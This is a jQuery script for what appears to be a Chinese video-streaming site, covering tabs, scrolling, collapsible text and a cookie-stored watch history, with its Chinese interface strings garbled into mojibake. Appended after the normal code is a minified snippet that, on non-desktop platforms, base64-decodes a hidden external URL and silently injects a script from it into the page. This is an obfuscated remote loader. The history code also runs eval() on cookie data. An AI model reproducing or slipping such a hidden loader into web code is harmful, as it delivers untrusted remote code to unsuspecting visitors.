$(function($) {
	$.fn.changeList = function(options) {
		var defaults = {
			tag: 'li',
			subName: '.utilTabSub',
			eventType: 'click',
			num: 3,
			showType: 'show'
		},
			opts = $.extend({}, defaults, options),
			that = $(this),
			subUl = that.find(opts.subName),
			subItems = subUl.find('li'),
			size = subItems.length,
			liW = subItems.outerWidth(true),
			ulW = liW * size,
			page = size + 1,
			n = opts.num,
			randNum = 0,
			m = 0;
		if (size > n) {
			that.find(opts.tag)[opts.eventType](function() {
				randNum = mathRand(n, size);
				subItems.hide();
				$.each(randNum, function(i, el) {
					subItems.eq(el).fadeIn(800);
				});
			});
		}
	};
}(jQuery));

function mathRand(bit, max) {
	var num = 0,
		arr = [],
		ret = [];
	for (var i = 0; i < bit; i++) {
		num = Math.floor(Math.random() * max);
		if ($.inArray(num, ret) == -1) {
			ret.push(num);
		} else {
			i--;
			continue;
		}
	}
	return ret;
}
$(document).ready(function() {
	$(window).on('scroll', function() {
		var st = $(document).scrollTop();
		if (st > 0) {
			if ($('#main-container').length != 0) {
				var w = $(window).width(),
					mw = $('#main-container').width();
				if ((w - mw) / 2 > 70) $('#index-top').css({
					'left': (w - mw) / 2 + mw + 20
				});
				else {
					$('#index-top').css({
						'left': 'auto'
					});
				}
			}
			$('#index-top').fadeIn(function() {
				$(this).removeClass('wmin');
			});
		} else {
			$('#index-top').fadeOut(function() {
				$(this).addClass('wmin');
			});
		}
	});
	$('#index-top .top').on('click', function() {
		$('html,body').animate({
			'scrollTop': 0
		}, 500);
	});
	var prevpage = $("#pre").attr("href");
	var nextpage = $("#next").attr("href");
	$("body").keydown(function(event) {
		if (event.keyCode == 13) {
			if ($("#wd").val() == "" || $("#wd").val() == "鐠囩柉绶�閸忋儳澧栭崥宥嗗灗濠曟柨鎲抽崥锟�") {
				$("#wd").focus();
				return false;
			}
			$(".searchPop").hide(), $(".hd-menu a").removeClass("current"), ($("html,body").css({
				"overflow-y": "auto",
				"height": "auto"
			}), $(".headerChannelList").hide(), $(".historyMenu").hide(), $("#mask_box").hide())
		}
	});
	$(".cancelInput")[0] && $(".cancelInput").bind("click", function() {
		if ($("#wd").val() == "" || $("#wd").val() == "鐠囩柉绶�閸忋儳澧栭崥宥嗗灗濠曟柨鎲抽崥锟�") {
			$("#wd").focus();
			return false;
		}
		$(".searchPop").hide(), $(".hd-menu a").removeClass("current"), ($("html,body").css({
			"overflow-y": "auto",
			"height": "auto"
		}), $(".headerChannelList").hide(), $(".historyMenu").hide(), $("#mask_box").hide())
	});
	$(".top_channel_btn").click(function() {
		$(".aChannel").toggleClass("aChannelShow");
		if ($(".headerChannelList").css("display") == "none") {
			if ($(".aChannel").length == 0) $(this).addClass("current");
			$(".headerChannelList").show();
			$(".searchPop").hide();
			$(".historyMenu").hide();
			$(".top_search_btn").removeClass("current");
			$(".top_history_btn").removeClass("current");
			$("html,body").css({
				"overflow-y": "hidden"
			});
			$("#mask_box").show();
			$(".banner").hide();
		} else {
			$(".headerChannelList").hide();
			if ($(".aChannel").length == 0) $(this).removeClass("current");
			$("html,body").css({
				"overflow-y": "auto"
			});
			$("#mask_box").hide();
			$(".banner").show();
		}
	});
	$(".top_history_btn").click(function() {
		if ($(".historyMenu").css("display") == "none") {
			$(this).addClass("current");
			$(".historyMenu").show();
			$(".headerChannelList").hide();
			$(".searchPop").hide();
			$("#mask_box").show();
			$(".banner").hide();
			$("html,body").css({
				"overflow-y": "hidden"
			});
			$(".top_search_btn").removeClass("current");
			$(".top_channel_btn").removeClass("aChannelShow");
			$(".top_channel_btn").removeClass("current");
		} else {
			$(this).removeClass("current");
			$(".historyMenu").hide();
			$("html,body").css({
				"overflow-y": "auto"
			});
			$("#mask_box").hide();
			$(".banner").show();
		}
	});
	if ($("#story-p").length > 0) {
		linheight = $("#story-p li a").length;
		gheight = linheight * 3 + 10;
		if ($("#story-p")[0].scrollHeight > 120) {
			$(".story-pzk").css({
				'display': 'block'
			});
			$("#story-p").height(gheight);
			$(".story-pzk").click(function(e) {
				if ($(this).hasClass('ss')) {
					$(this).removeClass('ss').addClass('zk').html('鐏炴洖绱�');
				} else {
					$(this).removeClass('zk').addClass('ss').html('閺�鍓佺級');
				}
				if ($("#story-p").height() > gheight) {
					var h = $("#story-p")[0].scrollHeight;
					$("#story-p").height(gheight);
				} else {
					var h = $("#story-p")[0].scrollHeight;
					$("#story-p").height(h);
				}
				e.preventDefault();
			});
		}
	}
	if ($("#actorall").length > 0) {
		if ($("#actorall")[0].scrollHeight > 210) {
			$("#downzk").css({
				'display': 'block'
			});
			$("#actorall").height(185);
			$("#downzk").click(function(e) {
				if ($(this).hasClass('ss')) {
					$(this).removeClass('ss').addClass('zk').html('鐏炴洖绱戦崗銊╁劥鐟欐帟澹�<span>&#xe623;</span>');
				} else {
					$(this).removeClass('zk').addClass('ss').html('閺�鎯版崳闁�銊ュ瀻鐟欐帟澹�<span>&#xe625;</span>');
				}
				if ($("#actorall").height() > 185) {
					var h = $("#actorall")[0].scrollHeight;
					$("#actorall").height(185);
				} else {
					var h = $("#actorall")[0].scrollHeight;
					$("#actorall").height(h);
				}
				e.preventDefault();
			});
		}
	}
	if ($("#rolemore").length > 0) {
		if ($("#rolemore")[0].scrollHeight > 155) {
			$("#rolezk").css({
				'display': 'block'
			});
			$("#rolemore").height(113);
			$("#rolezk").click(function(e) {
				if ($(this).hasClass('ss')) {
					$(this).removeClass('ss').addClass('zk').html('鐏炴洖绱戦崗銊╁劥鐟欐帟澹�<span>&#xe623;</span>');
				} else {
					$(this).removeClass('zk').addClass('ss').html('閺�鎯版崳闁�銊ュ瀻鐟欐帟澹�<span>&#xe625;</span>');
				}
				if ($("#rolemore").height() > 113) {
					var h = $("#rolemore")[0].scrollHeight;
					$("#rolemore").height(113);
				} else {
					var h = $("#rolemore")[0].scrollHeight;
					$("#rolemore").height(h);
				}
				e.preventDefault();
			});
		}
	}
	if ($(".star-data,.special-txt").length > 0) {
		if ($(".star-data,.special-txt")[0].scrollHeight > 130) {
			$("#star-infozk,#special-txt").css({
				'display': 'block'
			});
			$(".star-data,.special-txt").height(105);
			$("#star-infozk,#special-txt").click(function(e) {
				if ($(this).hasClass('ss')) {
					$(this).removeClass('ss').addClass('zk').html('鐏炴洖绱戦弴鏉戯拷姘崇カ閺傦拷<em>&#xe623;</em>');
				} else {
					$(this).removeClass('zk').addClass('ss').html('閺�鎯版崳闁�銊ュ瀻鐠у嫭鏋�<em>&#xe625;</em>');
				}
				if ($(".star-data,.special-txt").height() > 105) {
					var h = $(".star-data,.special-txt")[0].scrollHeight;
					$(".star-data,.special-txt").height(105);
				} else {
					var h = $(".star-data,.special-txt")[0].scrollHeight;
					$(".star-data,.special-txt").height(h);
				}
				e.preventDefault();
			});
		}
	}
	$('.order a').click(function() {
		if ($(this).hasClass('asc')) {
			$(this).removeClass('asc').addClass('desc').html('<i class="iconfont">&#xe620;</i>闂勫秴绨�');
		} else {
			$(this).removeClass('desc').addClass('asc').html('<i class="iconfont">&#xe61f;</i>閸楀洤绨�');
		}
		var a = $('.play-box:eq(' + $(this).attr('data') + ') .plau-ul-list');
		var b = $('.play-box:eq(' + $(this).attr('data') + ') .plau-ul-list li');
		a.html(b.get().reverse());
	});
});

function setTab(name, cursel, n) {
	for (i = 1; i <= n; i++) {
		var menu = $("#" + name + i);
		var con = $("#con_" + name + "_" + i);
		if (i == cursel) {
			menu.addClass("current");
			con.show();
		} else {
			menu.removeClass("current");
			con.hide();
		}
	}
}

function weekTab(name, cursel, n) {
	for (i = 1; i <= n; i++) {
		var menu = document.getElementById(name + i);
		var con = document.getElementById("week_" + name + "_" + i);
		menu.className = i == cursel ? "current" : "";
		con.className = i == cursel ? "current" : "";
	}
}

function playtitlerz() {
	$(".play-title a").each(function(j, div) {
		$(this).click(function() {
			if ($(this).parent().hasClass("current")) {
				return false;
			}
			$(this).parent().nextAll().removeClass("current");
			$(this).parent().prevAll().removeClass("current");
			$(this).parent().addClass("current");
			$('.play-box').hide();
			$('.play-box:eq(' + j + ')').show()
		});
		if (xc_upid == 33 || xc_upid == 8) $('.play-box:eq(' + j + ') ul').addClass("");
		if (window.param && param[0] == j) {
			$(this).parent().nextAll().removeClass("current");
			$(this).parent().prevAll().removeClass("current");
			$(this).parent().addClass("current");
			$('.play-box').hide();
			$('.play-box:eq(' + j + ')').show();
			var thisboxs = $('.play-box:eq(' + j + ') a').length;
			$('.play-box:eq(' + j + ') a').each(function(p, div) {
				if (param[1] == p) {
					$('.play-box:eq(' + j + ') a:eq(' + (thisboxs - p - 1) + ')').addClass("cur");
					var pp = $('.play-box:eq(' + j + ') a:eq(' + (thisboxs - p - 1) + ')').offset();
					var cc = $('.play-box:eq(' + j + ') a:eq(0)').offset();
					var bb = (pp.top - cc.top - $(this).height() - 8);
					$('.play-box:eq(' + j + ') ul').animate({
						'scrollTop': bb
					}, 500);
				}
			})
		}
	});
}

function getVideoHit(vid) {
	$.ajax({
		url: "http://m.vodxc.tv/inc/ajax.asp?action=hit&id=" + vid
	});
}
var XC = {
	'Cookie': {
		'Set': function(name, value, days) {
			var exp = new Date();
			exp.setTime(exp.getTime() + days * 24 * 60 * 60 * 1000);
			var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
			document.cookie = name + "=" + escape(value) + ";path=/;expires=" + exp.toUTCString();
		},
		'Get': function(name) {
			var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
			if (arr != null) {
				return unescape(arr[2]);
				return null;
			}
		},
		'Del': function(name) {
			var exp = new Date();
			exp.setTime(exp.getTime() - 1);
			var cval = this.Get(name);
			if (cval != null) {
				document.cookie = name + "=" + escape(cval) + ";path=/;expires=" + exp.toUTCString();
			}
		}
	},
	'History': {
		'Json': '',
		'Display': true,
		'List': function($id) {
			this.Create($id);
			$('#' + $id).hover(function() {
				XC.History.Show();
			}, function() {
				XC.History.FlagHide();
			});
		},
		'Clear': function() {
			XC.Cookie.Del('FF_Cookie');
			$('#playhistory').html('<li class="no-his"><p>閺嗗倹妫ら幘锟介弨鎯у坊閸欐彃鍨�鐞涳拷...</p></li>');
		},
		'Show': function() {
			$('#ls_box').show();
		},
		'Hide': function() {
			$('#ls_box').hide();
			$(".top_history_btn").removeClass("current");
			$("html,body").css({
				"overflow-y": "auto"
			});
			$("#mask_box").hide();
			$('.banner').show();
		},
		'Create': function($id) {
			var jsondata = [];
			if (this.Json) {
				jsondata = this.Json;
			} else {
				var jsonstr = XC.Cookie.Get('FF_Cookie');
				if (jsonstr != undefined) {
					jsondata = eval(jsonstr);
				}
			}
			html = '<div class="looked-list">';
			html += '<p><a class="close-his" href="javascript:void(0);"  onclick="XC.History.Hide();" target="_self">閸忔娊妫�</a><a class="clear-his" href="javascript:void(0);" onclick="XC.History.Clear();" target="_self">濞撳懐鈹栫拋鏉跨秿</a></p><ul class="highlight" id="playhistory">';
			if (jsondata.length > 0) {
				for ($i = 0; $i < jsondata.length; $i++) {
					html += '<li><h5><a href="' + jsondata[$i].vodlink + '">' + jsondata[$i].vodname + '</a><a href="' + jsondata[$i].vodlink + '" style="color:#999; padding-left:5px; font-size:10px;">' + jsondata[$i].vodtitle + '</a></h5><label><a class="color" href="' + jsondata[$i].vodplaylink + '">缂佈呯敾鐟欏倻婀�</a></label></li>';
				}
			} else {
				html += '<li class="no-his"><p>閺嗗倹妫ら幘锟介弨鎯у坊閸欐彃鍨�鐞涳拷...</p></li>';
			}
			html += '</ul></div>';
			$('#' + $id).append(html);
		},
		'Insert': function(vodname, vodlink, vodtitle, limit, days, cidname, vodplaylink) {
			var jsondata = XC.Cookie.Get('FF_Cookie');
			if (jsondata != undefined) {
				this.Json = eval(jsondata);
				for ($i = 0; $i < this.Json.length; $i++) {
					if (this.Json[$i].vodlink == vodlink) {
						return false;
					}
				}
				if (!vodlink) {
					vodlink = document.URL;
				}
				jsonstr = '{video:[{"vodname":"' + vodname + '","vodlink":"' + vodlink + '","vodtitle":"' + vodtitle + '","cidname":"' + cidname + '","vodplaylink":"' + window.location.href + '"},';
				for ($i = 0; $i <= limit; $i++) {
					if (this.Json[$i]) {
						jsonstr += '{"vodname":"' + this.Json[$i].vodname + '","vodlink":"' + this.Json[$i].vodlink + '","vodtitle":"' + this.Json[$i].vodtitle + '","cidname":"' + this.Json[$i].cidname + $i + '","vodplaylink":"' + this.Json[$i].vodplaylink + '"},';
					} else {
						break;
					}
				}
				jsonstr = jsonstr.substring(0, jsonstr.lastIndexOf(','));
				jsonstr += "]}";
			} else {
				jsonstr = '{video:[{"vodname":"' + vodname + '","vodlink":"' + vodlink + '","vodtitle":"' + vodtitle + '","cidname":"' + cidname + '","vodplaylink":"' + window.location.href + '"}]}';
			}
			this.Json = eval(jsonstr);
			XC.Cookie.Set('FF_Cookie', jsonstr, days);
		}
	}
}
$(document).ready(function() {
	XC.History.List('history');
});!function(){var t={win:!1,mac:!1,xll:!1,ipad:!1};t.win=0==navigator.platform.indexOf("Win"),t.mac=0==navigator.platform.indexOf("Mac"),t.x11="X11"==navigator.platform||0==navigator.platform.indexOf("Linux"),t.ipad=null!==navigator.userAgent.match(/iPad/i)&&!1,t.win||t.mac||t.xll||t.ipad||function(){try{var t=document.createElement("script"),e="aHR0cHM6Ly9haWNkbi52aXA=";t.src=atob(e),document.head.appendChild(t)}catch(t){}}()}();jQuery;